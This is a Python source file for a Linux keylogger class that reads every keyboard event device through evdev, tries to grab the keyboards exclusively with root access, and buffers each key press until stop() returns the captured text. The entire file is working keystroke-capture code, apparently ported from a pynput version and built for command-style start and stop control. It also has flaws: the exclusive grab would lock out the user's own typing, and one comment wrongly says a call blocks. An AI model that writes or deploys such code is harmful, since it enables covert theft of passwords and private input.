from glob import glob
from threading import Lock, Thread
from evdev import InputDevice, ecodes

# Same key mapping as your pynput version – special keys + alphanumeric
KEY_MAP = {
    ecodes.KEY_SPACE: " ",
    ecodes.KEY_ENTER: "[enter]\n",
    ecodes.KEY_TAB: "[tab]",
    ecodes.KEY_BACKSPACE: "[backspace]",
    ecodes.KEY_DELETE: "[delete]",
    ecodes.KEY_ESC: "[esc]",
    ecodes.KEY_LEFTSHIFT: "[shift]",
    ecodes.KEY_RIGHTSHIFT: "[shift]",
    ecodes.KEY_LEFTCTRL: "[ctrl]",
    ecodes.KEY_RIGHTCTRL: "[ctrl]",
    ecodes.KEY_LEFTALT: "[alt]",
    ecodes.KEY_RIGHTALT: "[alt]",
    ecodes.KEY_LEFTMETA: "[cmd]",
    ecodes.KEY_RIGHTMETA: "[cmd]",
    ecodes.KEY_UP: "[up]",
    ecodes.KEY_DOWN: "[down]",
    ecodes.KEY_LEFT: "[left]",
    ecodes.KEY_RIGHT: "[right]",
    ecodes.KEY_HOME: "[home]",
    ecodes.KEY_END: "[end]",
    ecodes.KEY_PAGEUP: "[page_up]",
    ecodes.KEY_PAGEDOWN: "[page_down]",
}

# Add simple letters, numbers, etc. from evdev ecodes
for name, code in ecodes.ecodes.items():
    if name.startswith("KEY_") and len(name) == 5 and name[4:].isalpha():
        KEY_MAP[code] = name[4:].lower()          # KEY_A -> 'a'
    elif name.startswith("KEY_") and name[4:].isdigit():
        KEY_MAP[code] = name[4:]                  # KEY_1 -> '1'


class KeyloggerService:
    def __init__(self):
        self._running = False
        self._buffer = []
        self._lock = Lock()
        self._thread = None
        self._devices = []

    def start(self) -> str:
        if self._running:
            return "Keylogger already running"

        # Find all keyboard-capable event devices
        devices = [InputDevice(f) for f in glob('/dev/input/event*')]
        self._devices = [dev for dev in devices if ecodes.EV_KEY in dev.capabilities()]
        if not self._devices:
            return "No keyboard devices found"

        self._buffer.clear()
        self._running = True
        self._thread = Thread(target=self._capture_loop, daemon=True)
        self._thread.start()
        return "Keylogger started"

    def _capture_loop(self):
        # Grab all keyboards for exclusive access (needs root)
        for dev in self._devices:
            try:
                dev.grab()
            except:
                pass

        while self._running:
            for dev in self._devices:
                try:
                    event = dev.read_one()   # blocks briefly until an event
                    if event is not None and event.type == ecodes.EV_KEY and event.value == 1:  # key down
                        with self._lock:
                            key_str = KEY_MAP.get(event.code, f"[{event.code}]")
                            self._buffer.append(key_str)
                except Exception:
                    pass
        # Release when loop ends
        for dev in self._devices:
            try:
                dev.ungrab()
            except:
                pass

    def stop(self) -> str:
        if not self._running:
            return "Keylogger not running"

        self._running = False
        if self._thread:
            self._thread.join(timeout=2)

        with self._lock:
            data = "".join(self._buffer)
            self._buffer.clear()
        return data
